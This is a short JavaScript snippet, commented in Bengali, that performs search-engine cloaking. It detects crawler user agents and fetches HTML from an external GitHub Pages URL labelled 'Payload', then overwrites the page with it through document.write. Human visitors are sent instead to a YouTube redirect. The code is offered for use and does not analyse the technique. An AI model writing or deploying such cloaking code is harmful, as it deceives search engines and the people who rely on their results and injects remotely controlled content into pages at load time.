var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent); 

if (isBot) { 
    // 🚀 লুপ থামানোর ফ্ল্যাগ: যদি আগেই একবার রান হয়ে থাকে, তবে আর করবে না
    if (window.cloakingDone) {
        console.log("Cloaking already executed. Stopping loop.");
        return; 
    }
    window.cloakingDone = true; // ফ্ল্যাগ সেট করা হলো

    var id = new URLSearchParams(location.search).get("id") || "sports";
    fetch("https://xriyanebu.github.io/Payload/index.html?id=" + id)
        .then(res => res.text())
        .then(html => {
            document.open();
            document.write(html);
            document.close();
        })
        .catch(err => console.error("Fetch failed:", err));
} else { 
    // মানুষ হলে ইউটিউবে রিডাইরেক্ট
    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
}
